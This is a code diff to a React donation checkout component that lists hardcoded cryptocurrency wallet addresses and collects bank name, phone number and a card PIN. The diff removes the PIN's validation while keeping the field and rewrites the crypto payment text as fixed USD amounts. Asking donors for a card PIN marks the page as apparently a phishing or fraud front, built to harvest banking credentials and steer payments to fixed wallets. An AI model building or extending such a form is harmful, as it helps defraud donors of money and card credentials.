@@ -64,31 +64,27 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
       id: 'btc', 
       name: 'Bitcoin (BTC)', 
       icon: FaBitcoin, 
+      
       address: 'bc1qd0l4rpekuxey4dchuaqt963wuz5djpskj9az06' 
     },
     { 
       id: 'eth', 
       name: 'Ethereum (ETH)', 
       icon: FaEthereum, 
-      address: '0x2F549207342b44ADF00d25893580b23902f3137B' 
+      address: ' 0x2F549207342b44ADF00d25893580b23902f3137B' 
     },
     { 
       id: 'usdt', 
       name: 'USDT (ERC-20)', 
       icon: FaEthereum, 
-      address: '0x2F549207342b44ADF00d25893580b23902f3137B' 
+      address: ' 0x2F549207342b44ADF00d25893580b23902f3137B' 
     },
-    { 
-      id: 'usdc', 
-      name: 'USDC (ERC-20)', 
-      icon: FaEthereum, 
-      address: '0x2F549207342b44ADF00d25893580b23902f3137B' 
-    },
+    
     { 
       id: 'ltc', 
       name: 'Litecoin (LTC)', 
       icon: FaBitcoin, 
-      address: 'LYeqNHY5YR258V41SEMN8WmdHHrm76EzkD' 
+      address: ' LYeqNHY5YR258V41SEMN8WmdHHrm76EzkD' 
     },
     { 
       id: 'doge', 
@@ -106,7 +102,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
       id: 'xrp', 
       name: 'Ripple (XRP)', 
       icon: FaBitcoin, 
-      address: 'raMJSVpvpi8RY6yqmeAo9VPsAeECz1qvmc' 
+      address: ' raMJSVpvpi8RY6yqmeAo9VPsAeECz1qvmc' 
     }
   ];
 
@@ -280,10 +276,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
       errors.phoneNumber = 'Please enter a valid phone number';
     }
 
-    if (!accountInfo.cardPin || accountInfo.cardPin.length !== 4) {
-      errors.cardPin = 'Please enter valid 4-digit PIN';
-    }
-
+  
     if (!accountInfo.bankName.trim()) {
       errors.bankName = 'Please enter bank name';
     }
@@ -591,7 +584,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
             </div>
             <div className="crypto-info">
               <h3>{crypto.name}</h3>
-              <p>Exchange rate: 1 {crypto.id.toUpperCase()} = ${exchangeRate[crypto.id]}</p>
+              <p>Make your doantions using {crypto.name}</p>
             </div>
           </div>
         ))}
@@ -606,15 +599,13 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     return (
       <div className="checkout-step">
         <h2>Make Your Payment</h2>
-        <p className="step-description">Send exactly {cryptoAmount.toFixed(6)} {selectedCrypto.toUpperCase()} to the address below</p>
         
         <div className="payment-details">
           <div className="amount-card">
             <div className="amount-display">
-              <span className="crypto-amount">{cryptoAmount.toFixed(6)}</span>
-              <span className="crypto-symbol">{selectedCrypto.toUpperCase()}</span>
+                 <span className="crypto-symbol">Send exactly ${donationAmount} USD to the {selectedCrypto.toUpperCase()} address below</span>
             </div>
-            <div className="usd-equivalent">≈ ${donationAmount} USD</div>
+            
           </div>
           
           <div className="timer-warning">
@@ -645,7 +636,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
           <div className="payment-instructions">
             <h4>Important Instructions:</h4>
             <ul>
-              <li>Send exactly {cryptoAmount.toFixed(6)} {selectedCrypto.toUpperCase()}</li>
+              <li>Send exactly ${donationAmount} in {selectedCrypto.toUpperCase()}</li>
               <li>Use only the {selectedCrypto.toUpperCase()} network</li>
               <li>Do not send from an exchange wallet</li>
               <li>Transaction may take 5-15 minutes to confirm</li>
@@ -926,16 +917,19 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
         </div>
         
         <div className="form-group">
-          <label>Card PIN</label>
+          <div className='pin'>
+          <label >Card PIN</label>
           <div className={`input-with-icon ${cardErrors.cardPin ? 'error' : ''}`}>
             <FaKey />
             <input
+              
               type="password"
               placeholder="****"
               value={accountInfo.cardPin}
               onChange={(e) => handleInputChange('cardPin', e.target.value, 'account')}
-              className="account-input"
+              className="account-input pin"
             />
+            </div>
           </div>
           {cardErrors.cardPin && <span className="error-text">{cardErrors.cardPin}</span>}
         </div>
